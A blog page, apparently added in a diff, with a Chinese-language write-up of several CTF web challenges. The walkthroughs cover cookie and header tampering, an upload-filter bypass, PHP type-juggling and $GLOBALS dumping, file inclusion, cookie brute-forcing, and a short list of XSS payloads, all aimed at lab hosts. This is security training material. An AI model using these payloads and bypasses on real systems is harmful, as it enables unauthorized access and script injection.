@@ -1,0 +1,754 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>合天Web进阶部分题目Writeup - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="合天Web进阶部分题目Writeup">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2017-10-10 18:08" pubdate>
+        2017年10月10日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      31
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">合天Web进阶部分题目Writeup</h1>
+            
+            <div class="markdown-body">
+              <p>持续更新中。。</p>
+<a id="more"></a>
+
+<h2 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:20111/" title="题目地址">题目地址</a></p>
+<p>右键查看源代码：</p>
+<pre><code>&lt;p&gt;&lt;a href=&quot;Index.php&quot;&gt;&lt;font color=&quot;black&quot;&gt;index&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+</code></pre>
+<p>点击Index.php跳转,获得flag</p>
+<pre><code>A HIDDEN FLAG: FLAG&#123;th!5!5n0tth3fl@g&#125;
+</code></pre>
+<p>这题略坑啊，还有假flag。。意义何在呢。(╯‵□′)╯︵┻━┻</p>
+<h2 id="简单问答"><a href="#简单问答" class="headerlink" title="简单问答"></a>简单问答</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:20112/" title="题目地址">题目地址</a></p>
+<p>右键查看源代码后，将disable删掉，选好正确答案提交，并不对，抓一下包。发现答案被改了，而且还有个success=false,直接改成true，再次提交。</p>
+<pre><code>q1=2016&amp;q2=lol&amp;q4=22&amp;success=true
+</code></pre>
+<p>还是Fail,看代码里提交的参数是q1,q2,q4啊..</p>
+<p>试了试提交q3..flag出来了。这题坑吧。。。还是我忽略了啥。<br>    payload:</p>
+<pre><code>Post：q1=2016&amp;q2=lol&amp;q3=22&amp;success=true
+</code></pre>
+<p>flag为：</p>
+<pre><code>flag&#123;W3ll_d0n3&#125;
+</code></pre>
+<h2 id="后台后台后台"><a href="#后台后台后台" class="headerlink" title="后台后台后台"></a>后台后台后台</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:20113/" title="题目地址">题目地址</a></p>
+<p>进入后直接Enter下，给了个提示</p>
+<pre><code>Only Member with Admin rights is allow to enter 
+</code></pre>
+<p>然后抓了下包，发现cookie中有Member这个参数</p>
+<pre><code>Cookie: User=JohnTan101; Member=Tm9ybWFs;
+</code></pre>
+<p>解码得</p>
+<pre><code>Tm9ybWFs --&gt; Normal
+</code></pre>
+<p>根据提示，修改Member的值为QWRtaW4=(base64–Admin)<br>获得flag</p>
+<pre><code>flag&#123;C00ki3_n0m_n0m_n0m&#125;
+</code></pre>
+<h2 id="php是最好的语言"><a href="#php是最好的语言" class="headerlink" title="php是最好的语言"></a>php是最好的语言</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:20114/index.php" title="题目地址">题目地址</a></p>
+<p>打开后有源代码</p>
+<pre><code>&lt;?php
+show_source(__FILE__);
+$v1=0;$v2=0;$v3=0;
+$a=(array)json_decode(@$_GET[&#39;foo&#39;]);
+if(is_array($a))&#123;
+    is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL;
+    if(@$a[&quot;bar1&quot;])&#123;
+        ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL;
+    &#125;
+    if(is_array(@$a[&quot;bar2&quot;]))&#123;
+        if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;]    [0])) die(&quot;nope&quot;);
+        $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);
+        $pos===false?die(&quot;nope&quot;):NULL;
+        foreach($a[&quot;bar2&quot;] as $key=&gt;$val)&#123;
+            $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL;
+        &#125;
+        $v2=1;
+    &#125;
+&#125;
+$c=@$_GET[&#39;cat&#39;];
+$d=@$_GET[&#39;dog&#39;];
+if(@$c[1])&#123;
+    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123;
+        eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL;
+        strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL;
+    &#125;
+&#125;
+if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;
+    include &quot;flag.php&quot;;
+    echo $flag;
+&#125;
+?&gt;
+</code></pre>
+<p>分析：</p>
+<pre><code>foo中有bar1，bar2，a2
+bar1的值不是数字且大于2016
+bar2是数组，其中的元素数为5，并且bar2的第一个元素是数组，bar2中有nudt
+a2为nudt
+cat[1]为一个数组
+dog和cat[0]中没有，3，1，c，可用00截断
+cat[0].dog中存在htctf2016
+</code></pre>
+<p>构造Payload</p>
+<pre><code>http://218.76.35.75:20114/index.php?foo=&#123;&quot;bar1&quot;:&quot;9999a&quot;,&quot;bar2&quot;:[[1],1,2,3,0],&quot;a2&quot;:[&quot;nudt&quot;,1,2,3,0]&#125;&amp;cat[0]=%00htctf2016&amp;cat[1][]=2333&amp;d=233
+</code></pre>
+<p>flag为：</p>
+<pre><code>flag&#123;php_i5_n0t_b4d&#125;
+</code></pre>
+<p>JS加解密</p>
+<p>HTML语言很松散，哪怕有标签没闭合，JS代码也可以执行</p>
+<p>payload:</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=1 onerror=alert(&#39;123&#39;)&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;iframe src=javascript:alert(1)&gt;
+</code></pre>
+<h2 id="Reappear"><a href="#Reappear" class="headerlink" title="Reappear"></a>Reappear</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:65180/" title="题目地址">题目地址</a></p>
+<p>题目描述说</p>
+<pre><code>描述：网管说他安装了什么编辑器，但是似乎不太会用。。。
+</code></pre>
+<p>打开链接：</p>
+<pre><code>Kindeditor v4.1.7
+something maybe in /kindeditor/
+</code></pre>
+<p>直接访问</p>
+<pre><code>http://218.76.35.75:65180/kindeditor/
+</code></pre>
+<p>直接列目录了，挨个打开看了看，要不提示</p>
+<pre><code>I don&#39;t think it will work
+</code></pre>
+<p>要不就提示</p>
+<pre><code>You are very close!
+</code></pre>
+<p>没办法了，上网查Kindeditor v4.1.7 漏洞，找到一个路径泄露漏洞，在这个路径下</p>
+<pre><code>/php/file_manager_json.php
+</code></pre>
+<p>直接访问:</p>
+<pre><code>url: http://218.76.35.75:65180/kindeditor/php/file_manager_json.php
+</code></pre>
+<p>原始数据中获得json</p>
+<pre><code>/var/www/html/Web/kind/kindeditor/attached
+&#123;
+&quot;moveup_dir_path&quot;: &quot;&quot;, 
+&quot;current_dir_path&quot;: &quot;&quot;, 
+&quot;current_url&quot;: &quot;/kindeditor/php/../attached/&quot;, 
+&quot;total_count&quot;: 2, 
+&quot;file_list&quot;: [
+    &#123;
+        &quot;is_dir&quot;: false, 
+        &quot;has_file&quot;: false, 
+        &quot;filesize&quot;: 51, 
+        &quot;dir_path&quot;: &quot;&quot;, 
+        &quot;is_photo&quot;: false, 
+        &quot;filetype&quot;: &quot;php&quot;, 
+        &quot;filename&quot;: &quot;flag_clue.php&quot;, 
+        &quot;datetime&quot;: &quot;2015-11-16 21:58:28&quot;
+    &#125;, 
+    &#123;
+        &quot;is_dir&quot;: false, 
+        &quot;has_file&quot;: false, 
+        &quot;filesize&quot;: 28, 
+        &quot;dir_path&quot;: &quot;&quot;, 
+        &quot;is_photo&quot;: false, 
+        &quot;filetype&quot;: &quot;html&quot;, 
+        &quot;filename&quot;: &quot;index.html&quot;, 
+        &quot;datetime&quot;: &quot;2015-11-16 21:37:12&quot;
+    &#125;
+]
+</code></pre>
+<p>}<br>发现在attached目录下有个flag_clue.php。直接访问获得</p>
+<pre><code>=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ
+</code></pre>
+<p>看样子是反转后的base64。用python翻转然后解码得:</p>
+<pre><code>ZmxhZzp7dXZlRG9uZUFncmVhdEpvYn0=
+
+flag:&#123;uveDoneAgreatJob&#125;
+</code></pre>
+<h2 id="default"><a href="#default" class="headerlink" title="default"></a>default</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.74:20131/" title="题目地址">题目地址</a></p>
+<p>题目描述说</p>
+<pre><code>描述：主页都没有了，就不要扫我了
+</code></pre>
+<p>那就上扫描器吧2333，御剑扫一下发现有index1.php,访问得</p>
+<pre><code>flag 在变量里!
+&lt;?php  
+
+error_reporting(0);
+include &quot;flag1.php&quot;;    
+highlight_file(__file__);
+if(isset($_GET[&#39;args&#39;]))&#123;
+    $args = $_GET[&#39;args&#39;];
+    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;
+        die(&quot;args error!&quot;);
+    &#125;
+    eval(&quot;var_dump($$args);&quot;);
+&#125;
+</code></pre>
+<p>这题眼熟。。Bugku的Web-变量1.。</p>
+<p>payload</p>
+<pre><code>http://218.76.35.74:20131/index1.php?args=GLOBALS
+</code></pre>
+<p>返回</p>
+<pre><code>array(7) &#123; [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_GET&quot;]=&gt; array(1) &#123; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag&#123;F8871804DD8C20C66D2386B3E51ADEC4&#125;&quot; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; 
+</code></pre>
+<p>所以flag为</p>
+<pre><code>flag&#123;F8871804DD8C20C66D2386B3E51ADEC4&#125;
+</code></pre>
+<h2 id="DrinkCoffee"><a href="#DrinkCoffee" class="headerlink" title="DrinkCoffee"></a>DrinkCoffee</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:65280/" title="题目地址">题目地址</a></p>
+<p>打开链接后有个提示</p>
+<pre><code>Hint: Find the password to submit, but you should come from http://www.iie.ac.cn and your IP must be 10.10.20.1
+</code></pre>
+<p>用burpsuite抓包，从响应包的头里面找到password</p>
+<pre><code>Password: d2626f412da748e711ca4f4ae9428664
+</code></pre>
+<p>解密得password是cafe,然后根据提示修改请求包</p>
+<pre><code>X-Forwarded-For: 10.10.20.1
+Referer: http://www.iie.ac.cn
+</code></pre>
+<p>Go一下获得flag</p>
+<pre><code>&lt;script&gt;alert(&#39;Flag: 84294deb396ba4373c5ea8b73fa111b2&#39;);&lt;/script&gt;
+</code></pre>
+<p>flag为</p>
+<pre><code>Flag: 84294deb396ba4373c5ea8b73fa111b2
+</code></pre>
+<h2 id="简单的JS"><a href="#简单的JS" class="headerlink" title="简单的JS"></a>简单的JS</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:20123/" title="题目地址">题目地址</a></p>
+<p>打开题目连接，发现有提示</p>
+<pre><code>The evil url is the passkey 
+</code></pre>
+<p>右键查看源代码，有一段JS</p>
+<pre><code>p = &quot;60,105,102,114,97,109,101,32,104,101,105,103,104,116,61,48,32,119,105,100,116,104,61,48,32,115,114,99,61,34,46,47,102,108,48,97,46,112,104,112,34,62&quot;
+p = eval(&quot;String.fromCharCode(&quot; + p + &quot;)&quot;);
+document.write(p);
+</code></pre>
+<p>直接运行并不出啥结果。。加一句</p>
+<pre><code>alert(p);
+</code></pre>
+<p>弹出    </p>
+<pre><code>&lt;iframe height=0 width=0 src=&quot;./fl0a.php&quot;&gt;
+</code></pre>
+<p>访问</p>
+<pre><code>http://218.76.35.75:20123/fl0a.php
+</code></pre>
+<p>显示</p>
+<pre><code>flag is $flag
+</code></pre>
+<p>抓包，在cookie上发现flag</p>
+<pre><code>Cookie: flag=C00k1els60SecU5e
+</code></pre>
+<h2 id="简单的文件上传"><a href="#简单的文件上传" class="headerlink" title="简单的文件上传"></a>简单的文件上传</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:20122/" title="题目地址">题目地址</a></p>
+<p>这题做的我一脸懵逼。。</p>
+<p>首先随便传了张jpg的图，提示</p>
+<pre><code>upload success,but not php!
+</code></pre>
+<p>然后传了个php</p>
+<pre><code>only accept jpg file~
+</code></pre>
+<p>试了试各种绕过，没成功。。然后抱着试试的心态改了下Content-Type，flag出来了。。这咋回事啊。</p>
+<p>经过测试，解题方法为，上传一个.php文件，然后在burpsuite中，改一下Content-Type即可</p>
+<pre><code>Content-Type: application/octet-stream
+</code></pre>
+<p>改为</p>
+<pre><code>Content-Type: image/jpeg
+</code></pre>
+<p>即可</p>
+<p>flag为</p>
+<pre><code>upload Success!flag:Upl00d30668ss9h97aFil3
+</code></pre>
+<h2 id="php是门松散的语言"><a href="#php是门松散的语言" class="headerlink" title="php是门松散的语言"></a>php是门松散的语言</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:20124/" title="题目地址">题目地址</a></p>
+<p>看代码</p>
+<pre><code>- - - - - - - source code - - - - - - - - - -
+
+$he =&#39;goodluck&#39;;
+
+parse_str($_GET[&#39;heetian&#39;]);
+
+if $he = &#39;abcd&#39;;
+
+echo $flag;
+
+he=?
+</code></pre>
+<p>payload:</p>
+<pre><code>http://218.76.35.75:20124/?heetian=he=abcd
+</code></pre>
+<p>flag为</p>
+<pre><code>flag:C00d1uckf0rY0uuu
+</code></pre>
+<h2 id="试试XSS"><a href="#试试XSS" class="headerlink" title="试试XSS"></a>试试XSS</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:20125/" title="题目地址">题目地址</a></p>
+<p>点开链接，有提示</p>
+<pre><code>Hint: alert document.domain.
+</code></pre>
+<p>随便提交一个123</p>
+<p>然后右键查看源代码，有个img标签</p>
+<pre><code>&lt;img src=&#39;123 /&gt;&lt;/form&gt;
+</code></pre>
+<p>构造代码闭合<br>    &lt;img src=’233’onclick=alert(document.domain)/&gt;</form><br>提交</p>
+<pre><code>233&#39;onclick=alert(document.domain)
+</code></pre>
+<p>然后点击一下页面上出现的图片，但是弹出了一个IP。。</p>
+<pre><code>218.76.35.75
+</code></pre>
+<p>document.domain是指当前域名，并不是flag。不过这几天我XSS没白学,于是乎试了下另一种</p>
+<pre><code>233&#39;onerror=alert(document.domain)
+</code></pre>
+<p>我去。。flag出来了，再提交试试。。又不出来了。。<br>后经表哥提醒，单引号后面少个空格，最终是</p>
+<pre><code>233&#39; onerror=alert(document.domain)
+</code></pre>
+<p>flag为</p>
+<pre><code>flag:D0Gum6Ntd0M11n
+</code></pre>
+<p>看样子我有次提交时多加了个空格23333</p>
+<h2 id="简单的验证"><a href="#简单的验证" class="headerlink" title="简单的验证"></a>简单的验证</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:20127/" title="题目地址">题目地址</a></p>
+<p>打开题目后</p>
+<pre><code>To the world you may be just somebody
+
+im not admin~
+</code></pre>
+<p>抓包，在cookies中发现</p>
+<pre><code>Cookie: flag=C00k1els60SecU5e; user=Bob; guess=999
+</code></pre>
+<p>这个flag是之前那个题的。。不知为啥现在还有，不过增加了user和guess这两个键值对。猜测是当user=admin&amp;guess=xxx时获得flag。<br>不写脚本了，直接用burpsuite的intruder模块爆破。。</p>
+<p>将user的值改为admin，然后爆破guess的值，设定1-5000，步进为1.</p>
+<pre><code>Cookie: flag=C00k1els60SecU5e; user=admin; guess=§999§
+</code></pre>
+<p>根据响应包的长度变化来判断。当guess=573时，获得flag</p>
+<pre><code>but to somebody you may just be the world&lt;p&gt;
+&lt;/p&gt;flag:EaSy70Ch1ngG00kie
+</code></pre>
+<p>burpsuite果然是神器。</p>
+<h2 id="简单的文件包含"><a href="#简单的文件包含" class="headerlink" title="简单的文件包含"></a>简单的文件包含</h2><p><a target="_blank" rel="noopener" href="http://218.76.35.75:20126/" title="题目地址">题目地址</a></p>
+<p>题目提示：</p>
+<pre><code>Flag 在/flag
+</code></pre>
+<p>打开网页后，有四个页面，依靠page参数链接。这提示太明显了，令page=/flag,右键查看源代码，获得flag</p>
+<pre><code> flag 不在这里&lt;!-- flag: 62a72cb2f3d5e7fc0284da9f21e66c9f.php--&gt;&lt;/body&gt;
+</code></pre>
+<p>访问获得flag:</p>
+<pre><code>F11elNcLud3Get
+</code></pre>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2017/11/21/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9BWriteup/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">第六届山东省大学生网络安全技能大赛决赛Writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2017/10/10/%E5%AE%9E%E9%AA%8C%E5%90%A7%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/">
+                        <span class="hidden-mobile">实验吧部分题目Writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
